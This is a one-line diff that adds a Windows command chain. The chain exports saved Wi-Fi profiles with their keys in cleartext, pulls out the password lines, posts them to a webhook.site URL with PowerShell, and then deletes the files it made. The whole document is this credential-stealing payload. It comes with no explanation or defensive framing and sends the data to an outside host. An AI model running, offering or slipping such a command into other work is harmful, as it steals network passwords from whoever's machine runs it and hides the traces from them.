@@ -1,0 +1,1 @@
+cd %temp% && netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-pass && powershell Invoke-WebRequest -Uri https://webhook.site/f9d81831-4f16-4638-9a68-7c79a87a6a8e -Method POST -InFile Wi-Fi-pass && del Wi-* /s /f /q
